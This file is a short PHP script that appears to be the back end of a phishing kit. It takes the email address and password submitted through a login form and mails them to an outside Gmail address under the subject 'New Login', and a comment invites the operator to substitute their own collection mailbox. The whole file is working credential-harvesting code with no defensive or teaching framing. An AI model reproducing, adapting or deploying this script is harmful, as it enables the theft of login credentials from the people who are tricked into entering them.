<?php
session_start();
error_reporting(0);

$email = filter_input(INPUT_POST, 'email', FILTER_SANITIZE_EMAIL);
$password = trim(filter_input(INPUT_POST, 'password', FILTER_SANITIZE_STRING));

if ($email && $password) {
    $message = "Email Address: $email <br> Password: $password ";

    // Add your email address here
    $to = "resultlog70@gmail.com";
    $subject = "New Login";

    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
    $headers .= "From: $email\r\n";

    if (mail($to, $subject, $message, $headers)) {
        echo $message;
    } else {
        die('Failed to send email.');
    }
} else {
    die('Invalid input');
}
?>
